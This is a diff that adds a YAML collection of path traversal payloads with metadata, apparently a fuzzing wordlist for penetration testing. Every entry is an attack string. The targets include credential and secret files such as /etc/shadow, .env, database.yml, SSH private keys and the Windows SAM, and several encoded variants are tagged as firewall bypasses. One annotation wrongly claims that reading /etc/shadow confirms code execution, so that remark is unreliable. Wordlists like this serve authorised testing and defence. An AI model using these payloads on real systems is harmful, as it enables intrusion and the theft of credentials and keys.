@@ -1,0 +1,145 @@
+# Path Traversal Payloads with Metadata
+# Usage: Filter by os, encoding, and target_file
+
+payloads:
+  # Basic traversal - Linux
+  - payload: "../../../etc/passwd"
+    os: linux
+    encoding: none
+    target_file: /etc/passwd
+    type: basic
+
+  - payload: "../../../etc/shadow"
+    os: linux
+    encoding: none
+    target_file: /etc/shadow
+    type: basic
+    note: "Requires root - confirms RCE-level access"
+
+  - payload: "../../../etc/hosts"
+    os: linux
+    encoding: none
+    target_file: /etc/hosts
+    type: basic
+
+  # Process info
+  - payload: "../../../proc/self/environ"
+    os: linux
+    encoding: none
+    target_file: /proc/self/environ
+    type: info-disclosure
+    data_exposed: environment-variables
+
+  - payload: "../../../proc/self/cmdline"
+    os: linux
+    encoding: none
+    target_file: /proc/self/cmdline
+    type: info-disclosure
+    data_exposed: process-command
+
+  # Application files
+  - payload: "../../../app/.env"
+    os: linux
+    encoding: none
+    target_file: .env
+    type: credential-theft
+    data_exposed: api-keys-secrets
+
+  - payload: "../../../app/config/database.yml"
+    os: linux
+    encoding: none
+    target_file: database.yml
+    type: credential-theft
+    data_exposed: database-credentials
+
+  # SSH keys
+  - payload: "../../../home/.ssh/id_rsa"
+    os: linux
+    encoding: none
+    target_file: id_rsa
+    type: credential-theft
+    data_exposed: ssh-private-key
+    severity: critical
+
+  - payload: "../../../home/.bash_history"
+    os: linux
+    encoding: none
+    target_file: .bash_history
+    type: info-disclosure
+    data_exposed: command-history
+
+  # Logs
+  - payload: "../../../var/log/auth.log"
+    os: linux
+    encoding: none
+    target_file: auth.log
+    type: info-disclosure
+    data_exposed: auth-logs
+
+  # URL encoding bypass
+  - payload: "..%2f..%2f..%2fetc%2fpasswd"
+    os: linux
+    encoding: url-encode
+    target_file: /etc/passwd
+    type: waf-bypass
+
+  # Double URL encoding
+  - payload: "..%252f..%252f..%252fetc%252fpasswd"
+    os: linux
+    encoding: double-url-encode
+    target_file: /etc/passwd
+    type: waf-bypass
+
+  # UTF-8 encoding
+  - payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    os: linux
+    encoding: full-url-encode
+    target_file: /etc/passwd
+    type: waf-bypass
+
+  # Overlong UTF-8
+  - payload: "..%c0%af..%c0%af..%c0%afetc/passwd"
+    os: linux
+    encoding: overlong-utf8
+    target_file: /etc/passwd
+    type: waf-bypass
+
+  - payload: "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"
+    os: linux
+    encoding: fullwidth-slash
+    target_file: /etc/passwd
+    type: waf-bypass
+
+  # Backslash variants
+  - payload: "..\\/..\\/..\\//etc/passwd"
+    os: linux
+    encoding: mixed-slash
+    target_file: /etc/passwd
+    type: waf-bypass
+
+  - payload: "....\\\\....\\\\....\\\\etc\\\\passwd"
+    os: linux
+    encoding: double-backslash
+    target_file: /etc/passwd
+    type: waf-bypass
+
+  # Windows targets
+  - payload: "../../../Windows/System32/config/SAM"
+    os: windows
+    encoding: none
+    target_file: SAM
+    type: credential-theft
+    data_exposed: password-hashes
+    severity: critical
+
+  - payload: "..\\..\\..\\..\\Windows\\win.ini"
+    os: windows
+    encoding: none
+    target_file: win.ini
+    type: basic
+
+  - payload: "..\\..\\..\\..\\boot.ini"
+    os: windows
+    encoding: none
+    target_file: boot.ini
+    type: basic
